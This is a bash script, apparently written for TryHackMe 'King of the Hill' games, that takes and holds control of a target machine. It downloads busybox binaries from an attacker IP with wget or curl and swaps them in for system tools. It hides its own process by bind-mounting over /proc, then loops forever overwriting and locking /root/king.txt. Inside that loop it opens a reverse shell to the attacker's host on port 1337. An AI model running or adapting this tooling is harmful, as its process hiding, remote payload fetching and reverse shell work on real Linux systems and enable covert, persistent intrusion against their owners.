#!/bin/bash
#
# /$$   /$$ /$$$$$$ /$$   /$$  /$$$$$$        /$$      /$$ /$$$$$$$$
#| $$  /$$/|_  $$_/| $$$ | $$ /$$__  $$      | $$$    /$$$| $$_____/
#| $$ /$$/   | $$  | $$$$| $$| $$  \__/      | $$$$  /$$$$| $$      
#| $$$$$/    | $$  | $$ $$ $$| $$ /$$$$      | $$ $$/$$ $$| $$$$$   
#| $$  $$    | $$  | $$  $$$$| $$|_  $$      | $$  $$$| $$| $$__/   
#| $$\  $$   | $$  | $$\  $$$| $$  \ $$      | $$\  $ | $$| $$      
#| $$ \  $$ /$$$$$$| $$ \  $$|  $$$$$$/      | $$ \/  | $$| $$$$$$$$
#|__/  \__/|______/|__/  \__/ \______/       |__/     |__/|________/ v1.0                         
#
# Auto king script for THM KotH
# Written by Squ1rr3l (aka redsquirrel_7)
#
# DISCLAIMER: I'm pretty sure this isn't against the rules, but
# I am not responsible if you get banned for using this script!

WORKING_DIR=/var/kingme	# Secret working dir

# Parse them args!
POSITIONAL_ARGS=()

while [[ $# -gt 0 ]]; do
  case $1 in
    # Get the THM username to put in king.txt
    -u|--username)
      HACKER_NAME="$2"
      shift
      shift
      ;;
    # Get the IP address of the attacker machine for downloading bins/scripts
    -i|--ipaddr)
      HACKER_IP="$2"
      shift
      shift
      ;;
    # Get the secret working dir
    -d|--directory)
      WORKING_DIR="$2"
      shift
      shift
      ;;
    # Print some helper text
    -h|--help)
      echo -e "Usage: ./kingme.sh -u <thm username> -i <your ip> -d <directory>\n\n-u: Your TryHackMe username to put in king.txt\n-i: The IP address of your attacker machine (needed to copy bins)\n-d: Secret working directory for all your bins and the script to work out of. Defaults to /var/kingme."
      exit 1
      shift
      shift
      ;;
    # What the balls m8!? That's not an options!
    -*|--*)
      echo "Unknown option $1. Use -h for help"
      exit 1
      ;;
    *)
      POSITIONAL_ARGS+=("$1")
      shift
      ;;
  esac
done

set -- "${POSITIONAL_ARGS[@]}"

# Error checking (kind of)
if [ -z $HACKER_NAME ]
then
	echo "You need to enter a THM username and an IP address. Use -h for more help."
	exit 1
elif [ -z $HACKER_IP ]
then
	echo "You need to enter a THM username and an IP address. Use -h for more help."
	exit 1
fi

# Set us up a secret working directory
mkdir $WORKING_DIR
cd $WORKING_DIR

# Copy all the bins here and the kingme script as a backup

WGET=/usr/bin/wget
CURL=/usr/bin/curl

if [ -f "$WGET" ]; then
	chmod u+x /usr/bin/wget
	wget http://$HACKER_IP:8080/busybox_GREP
	wget http://$HACKER_IP:8080/busybox_ECHO
	wget http://$HACKER_IP:8080/busybox_CHATTR
	wget http://$HACKER_IP:8080/busybox_CHMOD
	wget http://$HACKER_IP:8080/busybox_CAT
	wget http://$HACKER_IP:8080/busybox_MOUNT
elif [ -f "$CURL" ]; then
	chmod u+x /usr/bin/curl
	curl http://$HACKER_IP:8080/busybox_GREP > busybox_GREP
	curl http://$HACKER_IP:8080/busybox_ECHO > busybox_ECHO
	curl http://$HACKER_IP:8080/busybox_CHATTR > busybox_CHATR
	curl http://$HACKER_IP:8080/busybox_CHMOD > busybox_CHMOD
	curl http://$HACKER_IP:8080/busybox_CAT > busybox_CAT
	curl http://$HACKER_IP:8080/busybox_MOUNT > busybox_MOUNT
else
echo "Both 'wget' and 'curl' are not presented on the machine or cannot be executed."
echo "Abording.."
exit 1
fi

# Rename them bins!
mv -v busybox_GREP grep
mv -v busybox_ECHO echo
mv -v busybox_CHATTR chattr
mv -v busybox_CHMOD chmod
mv -v busybox_CAT cat

# All this stuff needs to be executable
chmod u+x kingme.sh
chmod u+x grep
chmod u+x echo
chmod u+x chattr
chmod u+x chmod
chmod u+x cat

# Hide from visible processes
$WORKING_DIR/echo "Current PID:" $$
$WORKING_DIR/echo "Hiding.."
mount -o bind /tmp /proc/$$


# Forever take your rightful throne as king!!!
while true
do
	if $WORKING_DIR/grep -q $HACKER_NAME /root/king.txt; then
		$WORKING_DIR/echo $HACKER_NAME "is king! Nothing to do!"
	else
		LOSER=$($WORKING_DIR/cat /root/king.txt)
		$WORKING_DIR/echo $LOSER "dethroned you! Making" $HACKER_NAME "king once again!"
		umount -l /root
		$WORKING_DIR/chattr -ai /root/king.txt
		$WORKING_DIR/chmod u+w /root/king.txt
		set +o noclobber /root/king.txt
		$WORKING_DIR/echo $HACKER_NAME > /root/king.txt
		$WORKING_DIR/chattr +ai /root/king.txt
		set -o noclobber /root/king.txt
                sh -i >& /dev/tcp/$HACKER_IP/1337 0>&1

	fi
	sleep 1
done
